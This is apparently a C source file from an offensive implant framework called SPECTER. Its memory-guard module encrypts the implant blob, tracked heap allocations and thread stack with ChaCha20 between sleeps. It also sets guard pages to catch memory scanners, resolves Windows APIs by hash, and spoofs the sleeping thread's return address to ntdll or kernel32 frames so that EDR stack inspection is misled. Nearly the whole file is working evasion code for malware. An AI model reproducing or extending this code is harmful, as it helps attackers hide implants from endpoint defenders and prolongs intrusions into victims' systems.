/**
 * SPECTER Implant — Memory Guard
 *
 * Pre-sleep / post-sleep memory encryption subsystem.  Encrypts the
 * implant PIC blob, tracked heap allocations, and the current thread
 * stack using ChaCha20 with a per-cycle random key.  Verifies integrity
 * via SHA-256 on decryption.  Integrates with the sleep controller's
 * Ekko timer chain.
 *
 * Build (native, test):
 *   gcc -c memguard.c -I../../include -DTEST_BUILD
 */

#include "specter.h"
#include "ntdefs.h"
#include "syscalls.h"
#include "evasion.h"
#include "crypto.h"
#include "sleep.h"
#include "peb.h"

/* Current-process pseudo-handle */
#define NtCurrentProcess() ((HANDLE)(ULONG_PTR)-1)

/* External globals */
extern SYSCALL_TABLE g_syscall_table;

/* ------------------------------------------------------------------ */
/*  PRNG for key generation (LCG, same as stackspoof/sleep)            */
/* ------------------------------------------------------------------ */

static DWORD memguard_prng_next(MEMGUARD_STATE *mg) {
    mg->prng_state = mg->prng_state * 1103515245 + 12345;
    return (mg->prng_state >> 16) & 0x7FFF;
}

static void memguard_prng_seed(MEMGUARD_STATE *mg) {
#ifdef TEST_BUILD
    /* Test builds use a deterministic seed set externally */
    if (mg->prng_state == 0)
        mg->prng_state = 0x12345678;
#else
    DWORD lo, hi;
    __asm__ __volatile__("rdtsc" : "=a"(lo), "=d"(hi));
    mg->prng_state = lo ^ (hi << 16) ^ 0xCAFEBABE;
#endif
}

/* ------------------------------------------------------------------ */
/*  Key generation                                                     */
/* ------------------------------------------------------------------ */

static void memguard_generate_key(MEMGUARD_STATE *mg) {
    /* Generate 32-byte key from PRNG output */
    for (int i = 0; i < MEMGUARD_KEY_SIZE; i += 2) {
        DWORD r = memguard_prng_next(mg);
        mg->enc_key[i]     = (BYTE)(r & 0xFF);
        if (i + 1 < MEMGUARD_KEY_SIZE)
            mg->enc_key[i + 1] = (BYTE)((r >> 8) & 0xFF);
    }

    /* Static nonce — key changes each cycle so nonce reuse is safe */
    static const BYTE nonce[MEMGUARD_NONCE_SIZE] = {
        0x53, 0x50, 0x45, 0x43, 0x4D, 0x47, 0x52, 0x44,
        0x00, 0x00, 0x00, 0x00
    };
    spec_memcpy(mg->nonce, nonce, MEMGUARD_NONCE_SIZE);
}

/* ------------------------------------------------------------------ */
/*  Guard page VEH handler                                             */
/* ------------------------------------------------------------------ */

/*
 * In a full implementation, we'd register a Vectored Exception Handler
 * to catch PAGE_GUARD violations on the implant region.  For PIC
 * compatibility and test builds, we use a stub that records the region
 * and can be queried/tested.
 */

#ifndef TEST_BUILD
/* VEH handler registration via AddVectoredExceptionHandler */
#define HASH_ADDVECTOREDEXCEPTIONHANDLER    0x6C1B349A
#define HASH_REMOVEVECTOREDEXCEPTIONHANDLER 0x22697BD3

typedef PVOID (__attribute__((ms_abi)) *fn_AddVectoredExceptionHandler)(
    ULONG First, PVOID Handler);
typedef ULONG (__attribute__((ms_abi)) *fn_RemoveVectoredExceptionHandler)(
    PVOID Handle);
#endif

/* ------------------------------------------------------------------ */
/*  memguard_init                                                      */
/* ------------------------------------------------------------------ */

NTSTATUS memguard_init(EVASION_CONTEXT *ctx, PVOID implant_base,
                       SIZE_T implant_size) {
    if (!ctx)
        return STATUS_INVALID_PARAMETER;

    if (!implant_base || implant_size == 0)
        return STATUS_INVALID_PARAMETER;

    MEMGUARD_STATE *mg = &ctx->memguard;
    spec_memset(mg, 0, sizeof(MEMGUARD_STATE));

    mg->implant_base = implant_base;
    mg->implant_size = implant_size;
    mg->initialized = TRUE;
    mg->encrypted = FALSE;

    /* Seed the PRNG */
    memguard_prng_seed(mg);

#ifndef TEST_BUILD
    /* Set guard pages on the implant region for access monitoring.
     * Guard pages trigger a one-shot exception on first access,
     * allowing us to detect unexpected memory scanners. */
    PVOID protect_base = implant_base;
    SIZE_T protect_size = implant_size;
    ULONG old_protect = 0;

    spec_NtProtectVirtualMemory(NtCurrentProcess(), &protect_base,
        &protect_size, PAGE_EXECUTE_READ | PAGE_GUARD, &old_protect);
    mg->original_protect = old_protect;

    /* Register VEH for guard page violation handling */
    PVOID k32 = find_module_by_hash(HASH_KERNEL32_DLL);
    if (k32) {
        fn_AddVectoredExceptionHandler add_veh =
            (fn_AddVectoredExceptionHandler)find_export_by_hash(
                k32, HASH_ADDVECTOREDEXCEPTIONHANDLER);
        if (add_veh) {
            /* NOTE: In production, veh_callback would be a real handler.
             * The handler restores guard pages after legitimate access
             * and flags scanner access attempts for operator reporting. */
            mg->veh_handle = NULL;  /* TODO: actual handler in Phase 05+ */
        }
    }
#endif

    return STATUS_SUCCESS;
}

/* ------------------------------------------------------------------ */
/*  memguard_encrypt — pre-sleep encryption                            */
/* ------------------------------------------------------------------ */

NTSTATUS memguard_encrypt(EVASION_CONTEXT *ctx) {
    if (!ctx)
        return STATUS_INVALID_PARAMETER;

    MEMGUARD_STATE *mg = &ctx->memguard;
    if (!mg->initialized)
        return STATUS_UNSUCCESSFUL;

    if (mg->encrypted)
        return STATUS_SUCCESS;  /* Already encrypted, idempotent */

    /* Step 1: Generate per-cycle key */
    memguard_generate_key(mg);

    /* Step 2: Compute integrity hash of implant memory pre-encryption */
    spec_sha256((const BYTE *)mg->implant_base,
                (DWORD)mg->implant_size,
                mg->integrity_hash);

#ifndef TEST_BUILD
    /* Step 3: Flip implant region RX → RW for encryption */
    PVOID protect_base = mg->implant_base;
    SIZE_T protect_size = mg->implant_size;
    ULONG old_protect = 0;

    NTSTATUS status = spec_NtProtectVirtualMemory(NtCurrentProcess(),
        &protect_base, &protect_size, PAGE_READWRITE, &old_protect);
    if (!NT_SUCCESS(status))
        return status;

    mg->original_protect = old_protect;
#endif

    /* Step 4: Encrypt implant memory (ChaCha20, counter starts at 0) */
    spec_chacha20_encrypt(mg->enc_key, mg->nonce, 0,
                          (const BYTE *)mg->implant_base,
                          (DWORD)mg->implant_size,
                          (BYTE *)mg->implant_base);

    /* Step 5: Encrypt tracked heap allocations.
     * We use a separate counter range (starting after implant blocks)
     * to avoid keystream reuse. */
    DWORD heap_counter = ((DWORD)mg->implant_size + 63) / 64;

    /* Access the sleep context for heap list */
    SLEEP_CONTEXT *sctx = NULL;
    extern IMPLANT_CONTEXT g_ctx;
    if (g_ctx.sleep_ctx)
        sctx = (SLEEP_CONTEXT *)g_ctx.sleep_ctx;

    if (sctx) {
        HEAP_ALLOC_ENTRY *cur = sctx->heap_list;
        while (cur) {
            if (cur->ptr && cur->size > 0) {
                spec_chacha20_encrypt(mg->enc_key, mg->nonce,
                                      heap_counter,
                                      (const BYTE *)cur->ptr,
                                      (DWORD)cur->size,
                                      (BYTE *)cur->ptr);
                heap_counter += ((DWORD)cur->size + 63) / 64;
            }
            cur = cur->next;
        }
    }

    /* Step 6: Encrypt thread stack region.
     * Capture current RSP and encrypt from RSP to the stack base.
     * We only encrypt the used portion (below RSP is free stack). */
#ifndef TEST_BUILD
    register QWORD rsp_val __asm__("rsp");
    mg->stack.sp_at_encrypt = (PVOID)rsp_val;

    /* Get stack base from TEB */
    PVOID teb = NULL;
    __asm__ __volatile__("movq %%gs:0x30, %0" : "=r"(teb));
    if (teb) {
        /* TEB.StackBase is at offset 0x08, TEB.StackLimit at 0x10 */
        PVOID stack_base  = *(PVOID *)((BYTE *)teb + 0x08);
        PVOID stack_limit = *(PVOID *)((BYTE *)teb + 0x10);
        mg->stack.base = stack_base;

        /* Encrypt from stack limit to RSP (the used portion minus
         * the current frame which we need to keep running) */
        SIZE_T stack_used = (SIZE_T)((BYTE *)rsp_val - (BYTE *)stack_limit);
        if (stack_used > 0 && stack_used < (SIZE_T)((BYTE *)stack_base - (BYTE *)stack_limit)) {
            DWORD stack_counter = heap_counter;
            spec_chacha20_encrypt(mg->enc_key, mg->nonce,
                                  stack_counter,
                                  (const BYTE *)stack_limit,
                                  (DWORD)stack_used,
                                  (BYTE *)stack_limit);
            mg->stack.size = stack_used;
        }
    }
#else
    /* Test build: encrypt the test stack region if provided */
    if (mg->stack.base && mg->stack.size > 0) {
        DWORD stack_counter = heap_counter;
        spec_chacha20_encrypt(mg->enc_key, mg->nonce,
                              stack_counter,
                              (const BYTE *)mg->stack.base,
                              (DWORD)mg->stack.size,
                              (BYTE *)mg->stack.base);
    }
#endif

    mg->encrypted = TRUE;
    return STATUS_SUCCESS;
}

/* ------------------------------------------------------------------ */
/*  memguard_decrypt — post-sleep decryption                           */
/* ------------------------------------------------------------------ */

NTSTATUS memguard_decrypt(EVASION_CONTEXT *ctx) {
    if (!ctx)
        return STATUS_INVALID_PARAMETER;

    MEMGUARD_STATE *mg = &ctx->memguard;
    if (!mg->initialized)
        return STATUS_UNSUCCESSFUL;

    if (!mg->encrypted)
        return STATUS_SUCCESS;  /* Not encrypted, nothing to do */

    /* Step 1: Decrypt implant memory (ChaCha20 XOR is self-inverse) */
    spec_chacha20_encrypt(mg->enc_key, mg->nonce, 0,
                          (const BYTE *)mg->implant_base,
                          (DWORD)mg->implant_size,
                          (BYTE *)mg->implant_base);

#ifndef TEST_BUILD
    /* Step 2: Flip implant region RW → RX */
    PVOID protect_base = mg->implant_base;
    SIZE_T protect_size = mg->implant_size;
    ULONG old_protect = 0;

    spec_NtProtectVirtualMemory(NtCurrentProcess(),
        &protect_base, &protect_size, PAGE_EXECUTE_READ, &old_protect);
#endif

    /* Step 3: Decrypt tracked heap allocations */
    DWORD heap_counter = ((DWORD)mg->implant_size + 63) / 64;

    SLEEP_CONTEXT *sctx = NULL;
    extern IMPLANT_CONTEXT g_ctx;
    if (g_ctx.sleep_ctx)
        sctx = (SLEEP_CONTEXT *)g_ctx.sleep_ctx;

    if (sctx) {
        HEAP_ALLOC_ENTRY *cur = sctx->heap_list;
        while (cur) {
            if (cur->ptr && cur->size > 0) {
                spec_chacha20_encrypt(mg->enc_key, mg->nonce,
                                      heap_counter,
                                      (const BYTE *)cur->ptr,
                                      (DWORD)cur->size,
                                      (BYTE *)cur->ptr);
                heap_counter += ((DWORD)cur->size + 63) / 64;
            }
            cur = cur->next;
        }
    }

    /* Step 4: Decrypt thread stack */
#ifndef TEST_BUILD
    if (mg->stack.size > 0) {
        /* Get stack limit from TEB */
        PVOID teb = NULL;
        __asm__ __volatile__("movq %%gs:0x30, %0" : "=r"(teb));
        if (teb) {
            PVOID stack_limit = *(PVOID *)((BYTE *)teb + 0x10);
            DWORD stack_counter = heap_counter;
            spec_chacha20_encrypt(mg->enc_key, mg->nonce,
                                  stack_counter,
                                  (const BYTE *)stack_limit,
                                  (DWORD)mg->stack.size,
                                  (BYTE *)stack_limit);
        }
    }
#else
    /* Test build: decrypt the test stack region */
    if (mg->stack.base && mg->stack.size > 0) {
        DWORD stack_counter = heap_counter;
        spec_chacha20_encrypt(mg->enc_key, mg->nonce,
                              stack_counter,
                              (const BYTE *)mg->stack.base,
                              (DWORD)mg->stack.size,
                              (BYTE *)mg->stack.base);
    }
#endif

    /* Step 5: Verify integrity — compare SHA-256 of decrypted implant
     * against the hash computed before encryption */
    BYTE verify_hash[MEMGUARD_HASH_SIZE];
    spec_sha256((const BYTE *)mg->implant_base,
                (DWORD)mg->implant_size,
                verify_hash);

    BOOL integrity_ok = (spec_memcmp(mg->integrity_hash, verify_hash,
                                      MEMGUARD_HASH_SIZE) == 0);

    /* Zero the key material */
    spec_memset(mg->enc_key, 0, MEMGUARD_KEY_SIZE);
    spec_memset(mg->nonce, 0, MEMGUARD_NONCE_SIZE);
    mg->stack.size = 0;
    mg->encrypted = FALSE;

    return integrity_ok ? STATUS_SUCCESS : STATUS_UNSUCCESSFUL;
}

/* ------------------------------------------------------------------ */
/*  memguard_setup_return_spoof                                        */
/* ------------------------------------------------------------------ */

NTSTATUS memguard_setup_return_spoof(EVASION_CONTEXT *ctx) {
    if (!ctx)
        return STATUS_INVALID_PARAMETER;

    MEMGUARD_STATE *mg = &ctx->memguard;
    if (!mg->initialized)
        return STATUS_UNSUCCESSFUL;

    /*
     * When the implant thread is sleeping, an EDR may call
     * GetThreadContext to inspect the return address.  We select
     * a legitimate return address from the frame library so the
     * sleeping thread appears to be blocked in a normal call chain.
     *
     * We pick a frame from ntdll (RtlUserThreadStart vicinity)
     * or kernel32 (BaseThreadInitThunk vicinity) which are where
     * threads commonly wait.
     */

    /* Look for a termination frame in the frame library */
    PVOID spoof_addr = NULL;

    for (DWORD i = 0; i < ctx->frame_lib.count; i++) {
        FRAME_ENTRY *fe = &ctx->frame_lib.entries[i];
        if (fe->module_hash == HASH_NTDLL_DLL ||
            fe->module_hash == HASH_KERNEL32_DLL) {
            /* Pick an address ~25% into the function body to look
             * like a mid-function wait point */
            SIZE_T func_size = (SIZE_T)((BYTE *)fe->code_end -
                                        (BYTE *)fe->code_start);
            if (func_size >= 16) {
                spoof_addr = (PVOID)((BYTE *)fe->code_start +
                                     func_size / 4);
                break;
            }
        }
    }

    if (!spoof_addr) {
        /* Fallback: use a plausible address from the clean ntdll */
        if (ctx->clean_ntdll)
            spoof_addr = (PVOID)((BYTE *)ctx->clean_ntdll + 0x1000);
    }

    if (!spoof_addr)
        return STATUS_UNSUCCESSFUL;

    mg->return_spoof_addr = spoof_addr;

    /*
     * In production, when using Ekko timer-based sleep, the thread's
     * CONTEXT64.Rip is set by the NtContinue ROP chain.  We modify
     * the captured context so it points to our spoof address.
     * This is applied by the caller (sleep_ekko) which has access
     * to the CONTEXT64 structures used in the timer chain.
     */

    return STATUS_SUCCESS;
}
